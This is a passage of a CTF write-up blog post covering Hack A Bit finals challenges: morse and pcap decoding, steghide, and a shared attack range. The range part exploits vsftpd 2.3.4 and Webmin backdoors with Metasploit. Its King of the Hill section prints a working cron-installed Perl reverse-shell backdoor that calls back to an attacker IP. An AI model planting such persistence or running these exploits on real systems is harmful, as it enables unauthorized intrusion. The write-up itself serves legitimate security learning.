+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>export HAB_CONTROLLER<span style="color:#f92672">=</span>flag<span style="color:#f92672">{</span>almost_totally_full_control<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>export HAB_COREDUMP<span style="color:#f92672">=</span>flag<span style="color:#f92672">{</span>look_like_ur_a_real_RE<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>export HAB_BITSANDBYTES<span style="color:#f92672">=</span>flag<span style="color:#f92672">{</span>big_ret2flag_energy<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Unsure if this was an intended solution or not - the intended solution for the first one seems to be to buffer overflow to jump to the first flag function (whose address is provided by the leak), and the solution for the second one seems to be to calculate the address of the second flag function based on the first flag function, or simply get the address of the function from the provided binary (<code>PIE</code> is disabled), buffer overflow to jump there and get the flag. Nevertheless, getting a shell is more satisfying and we get all the flags at once!</p>
+<h1 id="3-triage">3. Triage<a href="#3-triage" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>We are given a set of 4 cryptography/forensics challenges - there are 2 wireshark challenges that are linked (use same file).</p>
+<h2 id="sluth-75">Sluth (75)<a href="#sluth-75" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<blockquote>
+<p>Author: Nate Singer (Helix)</p>
+</blockquote>
+<blockquote>
+<p>Everything in life is iterative&hellip;</p>
+</blockquote>
+<blockquote>
+<p>NON-STANDARD FLAG FORMAT</p>
+</blockquote>
+<p>We are given a (very large) file containing dots, dashes and slashes, hinting to morse code. Using cyberchef, we can decode from morse code, only to be met with more morse code! Decoding 5 times however, gives us the flag.</p>
+<p><em>Note: If you encountered problems doing this challenge, it might be due to the newline at the end of the text file which may cause some decoding issues.</em></p>
+
+  <img src="./img/cry1.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>Flag: <code>FIVE_TIMES_0.O</code></p>
+<h2 id="inspector-100">Inspector (100)<a href="#inspector-100" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<blockquote>
+<p>Author: Nate Singer (Helix)</p>
+</blockquote>
+<blockquote>
+<p>It&rsquo;s just a simple stream challenge, how hard can it be?</p>
+</blockquote>
+<blockquote>
+<p>Both challenges for this section use the same pcapng file.</p>
+</blockquote>
+<p>We are given a packet capture pcapng file. Following the TCP stream, we eventually find the flag at stream 48.</p>
+
+  <img src="./img/cry2.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>Flag: <code>flag{tcp_streams_reveal_more}</code></p>
+<h2 id="coverup-125">Coverup (125)<a href="#coverup-125" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<blockquote>
+<p>There is a challenge hidden in coverup.jpg, extract the flag and profit.</p>
+</blockquote>
+<p>We are given <code>challenge.jpg</code>. As an image file, we do some basic analysis on it - <code>binwalk</code>, <code>exiftool</code>, <code>strings</code>, and <code>stegsolve</code>. None of these really return any results, so we use <code>steghide</code>, an image stegonography tool that can hide and extract data with passwords, which turns out to be the solution. (<code>stegseek</code>, the program I used in the image is simply <code>steghide</code> but can brute force passwords from a wordlist, very fast. There was no password however.)</p>
+
+  <img src="./img/cry3.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>Flag: <code>flag{the_truth_is_burried_deep}</code></p>
+<h2 id="extraction-150">Extraction (150)<a href="#extraction-150" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<blockquote>
+<p>Author: Nate Singer (Helix)</p>
+</blockquote>
+<blockquote>
+<p>Check out the pcap file, something weird is going on in here&hellip;</p>
+</blockquote>
+<blockquote>
+<p>Both challenges for this section use the same pcapng file.</p>
+</blockquote>
+<p>Back to the wireshark pcapng challenge - as we continue to explore the file, we find some interesting data at around TCP stream ~110-140</p>
+
+  <img src="./img/cry4.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>Hmmmm&hellip; 8 characters of 0&rsquo;s and 1&rsquo;s, I wonder what that could be. Of course, it&rsquo;s binary. We find the range of these strings to be at stream 110-140. Using wireshark, we can filter and export only these specific packets.</p>
+
+  <img src="./img/cry5.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>Going to <code>File &gt; Export Packet Dissections &gt; As Plain Text</code>, we export the packet data. After a bit of formatting with regex, we can chuck the binary code into CyberChef which decodes it for us.</p>
+
+  <img src="./img/cry6.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>There are double ups due to one being the client and one being the server response. Either way, we get the flag: <code>flag{what_firewall?_what_IDS?}</code></p>
+<h1 id="4-range--zz-king-of-the-hill">4. Range &amp; zz. King of the Hill<a href="#4-range--zz-king-of-the-hill" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>These challenges involved attacking a machine, similar to <a href="https://www.hackthebox.com/">HackTheBox</a>! There is also attack defense components of it, being linked to King of the Hill.</p>
+<h2 id="connection-75">Connection (75)<a href="#connection-75" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<blockquote>
+<p>Author: Nate Singer (Helix)</p>
+</blockquote>
+<blockquote>
+<p>This section is a series of challenges in a semi-isolated cyber range. Your goal is to compromise the boxes and get the flags. Your first challenge is more of a sanity-check/confirmation. We wanted to use private keys for this but logistics of distributing them was challenge so its just password login for now. Check your email, at exactly 5pm PST Friday you received a credential and IP address for this jumpbox. You can also use the connection info listed below.</p>
+</blockquote>
+<blockquote>
+<p>You will use this jumpbox to attack other machines in the network. We&rsquo;ve installed nmap, metasploit and netcat for your convience. If you want other tooling installed later please reach out to staff and will consider those requests as you ask. Remember that you can use techniques like proxychains over SSH to emulate much of this functionality.</p>
+</blockquote>
+<p>From the email we recieved, we <code>ssh</code> to the machine. Looking around, we find the flag at <code>/opt/flag.txt</code>.</p>
+
+  <img src="./img/box1.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>Flag: <code>flag{welcome_to_the_range}</code></p>
+<h2 id="rightface-100">RightFace (100)<a href="#rightface-100" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<blockquote>
+<p>Author: Nate Singer (Helix)</p>
+</blockquote>
+<blockquote>
+<p>If you did the more advanced challenges during the qualifier this should already be familiar. Your goal here is to compromise the 10.128.0.5 machine and get access as the breakme user.</p>
+</blockquote>
+<blockquote>
+<p>Remember that there may be non-vulnerable services on the machine. Recon is the #1 priority. Keep this shell open once you have it, you&rsquo;ll need it for Left Face.</p>
+</blockquote>
+<p>We are told to compromise the <code>10.128.0.5</code> machine, and gain access as <code>breakme</code>.</p>
+<pre tabindex="0"><code>Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Scanning the address with <code>nmap</code> we find it running <code>vsftpd 2.3.4</code>. From the qualifiers, there was a same challenge where we were to the exploit the <a href="https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/">backdoor</a> in <code>vsftpd 2.3.4</code> to gain RCE.</p>
+<p>I chose to use Metasploit for this - never used Metasploit before this CTF, but as it came preinstalled on the machine I decided to try and I found it to be quite useful!</p>
+
+  <img src="./img/box2.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>After gaining RCE, we find <code>flag.txt</code> in our home directory.</p>
+<p>Flag: <code>flag{remember_this_one?_pays_to_be_a_winner}</code></p>
+<h2 id="leftface-125">LeftFace (125)<a href="#leftface-125" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<blockquote>
+<p>Author: Nate Singer (Helix)</p>
+</blockquote>
+<blockquote>
+<p>With access to 10.128.0.5 your goal is to escelate priveleges to the breakme-harder user. Ultimately your goal is simply to read out the flag in /home/breakme-harder/.</p>
+</blockquote>
+<p>This is a continuation of the previous challenge, <code>RightFace</code>. We are told to escalate privleges as the <code>breakme-harder</code> user to get the flag.</p>
+<p>Upon further exploration of the machine, we find the <code>breakme-harder</code> user and <code>flag.txt</code> inside its directly. However, we do not have sufficient permissions to read it.</p>
+
+  <img src="./img/box3.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>Going back to our home directory, we find a file which executes with the permissions of the <code>breakme-harder</code> user, called <code>escalator</code>. We also find its source code, <code>escalator.c</code>.</p>
+
+  <img src="./img/box4.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>Examining the code, we see it simply opens a file that we specify, and prints out its contents. Since <code>/home/breakme-harder/flag.txt</code> is only accessible by the <code>breakme-harder</code> user, and the binary runs as the <code>breakme-harder</code> user, we can use this to read the contents of the flag.</p>
+
+  <img src="./img/box5.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>Flag: <code>flag{evaluate_this_my_dude}</code></p>
+<h2 id="aboutface-150">AboutFace (150)<a href="#aboutface-150" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<blockquote>
+<p>Author: Nate Singer (Helix)</p>
+</blockquote>
+<blockquote>
+<p>Different box this time, your target is now 10.128.0.4&ndash;straight to root. Remember that there may be non-vulnerable services on the machine. Recon is the #1 focus.</p>
+</blockquote>
+<blockquote>
+<p>Once you have access to the box stay at the top of the hill and listen for flags on localhost:5000/tcp. You will get alive notices once every 60 seconds while you are connected so you can be sure that you&rsquo;ll receive flags at the specific release times. To see the release times check out the other section.</p>
+</blockquote>
+<blockquote>
+<p>Caviets You are root. This means you can do whatever you want, for the most part. You are welcome to lock people out but only in specific ways. If you accidentially take down any of the existing services or remove Nate&rsquo;s ability to SSH in for monitoring the machine will be reverted to the last known-good snapshot and you will probably lose access. This also goes for changing the flag files. If we determine that the flags has been altered the machine will also be reverted. Lastly, if someone has concurrent access for four flags in a row we may block them from future access to give others the opportunity to attack the machine&ndash;we&rsquo;ll decide this in real time during the weekend depending on how things go.</p>
+</blockquote>
+<p>Okay, now we are given a different machine to attack. Again scanning the machine with <code>nmap</code>, we discover a few services.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65529</span> closed ports
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE    VERSION
+</span></span><span style="display:flex;"><span>21/tcp    open  ftp        ProFTPD
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>3306/tcp  open  mysql      MariaDB <span style="color:#f92672">(</span>unauthorized<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>4369/tcp  open  epmd       Erlang Port Mapper Daemon
+</span></span><span style="display:flex;"><span>5000/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>10000/tcp open  http       MiniServ 1.890 <span style="color:#f92672">(</span>Webmin httpd<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>Searching online for vulnerabilities, we find that the service <code>MiniServ 1.890</code> is vulnerable to <a href="https://www.rapid7.com/db/modules/exploit/unix/webapp/webmin_backdoor/">Unauthenticated RCE</a>!</p>
+<p>Using Metasploit again, we exploit the vulnerability and get RCE.</p>
+
+  <img src="./img/box6.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>We find the flag in <code>/root/flag.txt</code>.</p>
+
+  <img src="./img/box8.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>Since the box is down as I&rsquo;m writing this, the image is someone else running <code>cat /root/flag.txt</code> which I had in my terminal history, where I captured their traffic with <code>tcpdump</code> ;)</p>
+<p>Flag: <code>flag{bestow_the_crown}</code></p>
+<h2 id="king-of-the-hill-30">King of The Hill (30)<a href="#king-of-the-hill-30" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<blockquote>
+<p>Once you have access to the fourth machine in the range you need to listen on port tcp/5000, you can do this with nc, for example. The flag will be sent at a specific time. Retain control of the box to get all the flags. We will spam the flag a few times around that point in time so that you are sure to receive it if you have things setup properly.</p>
+</blockquote>
+<blockquote>
+<p>We also may reset the machine if we determine that you have locked folks out in a way that gives you an unfair advantage. The vulnerable service on the box must stay present. We also may reset the machine any time two consecutive flags are retrieved by the same competitor.</p>
+</blockquote>
+<blockquote>
+<p>Additionally, we will send alive notices once every 60 seconds. If you have a valid listener you will receive these alive notices, BUT if you aren&rsquo;t careful your server may die when the connection closes!!</p>
+</blockquote>
+<p>This is a continuation of <code>AboutFace</code>, assuming we already have a shell on that machine. I will document some interesting events of roughly what happened below.</p>
+<p>There were 8 points in time where the flag would be sent on the machine to port <code>5000</code>. Anyone listening to the port would recieve the flag.</p>
+<pre tabindex="0"><code>    ├── 1. 7pm PST, Friday (30)
+    ├── 2. 9am PST, Saturday (30)
+    ├── 3. 11am PST, Saturday (30)
+    ├── 4. 1pm PST, Saturday (30)
+    ├── 5. 3pm PST, Saturday (30)
+    ├── 6. 5pm PST, Saturday (30)
+    ├── 7. 9am PST, Sunday (30)
+    └── 8. 11am PST, Sunday (30)
+</code></pre><p>However, as this is attack defense, with every player sharing the same <code>AboutFace</code> machine, players can patch vulnerabilities and given <code>root</code> permissions, could just nuke the whole box. It was quite interesting what events unfolded.</p>
+<h2 id="attack-defense">Attack Defense<a href="#attack-defense" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p><code>Eth007</code> first got access on the box and patched the MiniServ vulnerability, as well as getting the first KOTH flag. Upon the vulnerability being patched, no other players could access the machine, so they were KOTH for the first round. Same thing happened for the second round, and <code>Eth007</code> also got the second KOTH flag.</p>
+<p>As for the third (or fourth?) round, the machine was reset and I was able to exploit the vulnerability and access the machine. However, unfortunetely at that time the bot sending the alive pings and the flag died, so the flag was never sent. Since I was listening for the flag, the organiser (<code>Nate Singer (Helix)</code>) just DM&rsquo;ed me the flag.</p>
+<p>Afterwards, many players had gained access to the <code>AboutFace</code> box and were already implementing their countermeasures to prevent other players from accessing the box. For example, shells and processes were being killed, but in particular at one point, someone decided to entirely delete the <code>netcat</code> binary! Furthermore, the <code>perl</code> command was replaced with something else like <code>cat</code>.</p>
+<p>This killed my backdoor which I implemented with <code>crontab</code>, having a reverse shell sent to a specific port to my IP every minute, since my reverse shell used <code>perl</code>. I only figured this out after my shells were killed, and after trying to exploit <code>MiniServ</code> (which was the initial access) didn&rsquo;t work. I was using Metasploit, which failed to exploit as it said the server wasn&rsquo;t vulnerable. However, this meant it didn&rsquo;t even try the exploit - it just said it wasn&rsquo;t vulnerable. After setting an option in Metasploit, it surprisingly worked and I get my shell back!</p>
+
+  <img src="./img/box7.png"  class="center"  style="border-radius: 5px; width: 100%;"  />
+
+
+<p>Confirming that <code>perl</code> command didn&rsquo;t work anymore, I hurry to put a new backdoor before I&rsquo;m kicked out again. Checking <code>/usr/bin</code> I can see the <code>perl</code> binary is still there, so I can still run it with <code>/usr/bin/perl</code>. And thus, I edited my crontab backdoor, which finally worked!</p>
+<pre tabindex="0"><code>echo &#39;* * * * * /usr/bin/perl -MIO -e &#34;\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\&#34;10.128.0.2:17893\&#34;);STDIN-&gt;fdopen(\$c,r);\$~-&gt;fdopen(\$c,w);system\$_ while&lt;&gt;&#34;&#39; | crontab -
+</code></pre><p>A short while after I got locked out of initial access, the backdoor proved to come in clutch as it gave me access right back after being locked out.</p>
+<p>But then suddenly, after the box was reset and many players gained access, while waiting for the flag, the box died. The box continued to stay offline for the remainder of the competitions, with noone recieving the 6th, 7th or 8th flag. Not sure what caused the box to crash, maybe someone ran <code>shutdown</code>, we all had root permissions after all.</p>
+<h1 id="conclusion">Conclusion<a href="#conclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>You made it to the end! Hope you enjoyed the writeups, if there&rsquo;s anything I missed or suggestions please let me know on discord or elsewhere. This was my first time doing anything related to Attack Defense in a CTF so it was quite interesting, and I look forward to next year&rsquo;s competition!</p>
+<p>Oh, and, huge thanks to <a href="https://www.youtube.com/channel/UC1yduXnGCQ6qJW9O7QMVN7w"><code>Nate Singer (helix)</code></a> for organising the competition as well as address all the issues with challenges!</p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://TheSavageTeddy.github.io/posts/ret2libm-iris2023/">
+                <span class="button__icon">←</span>
+                <span class="button__text">ret2libm - IrisCTF 2023</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://TheSavageTeddy.github.io/posts/writeups-hackabit2023/">
+                <span class="button__text">Full Writeups - Hack A Bit CTF Qualifiers 0x01</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>uwuTeddy</span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
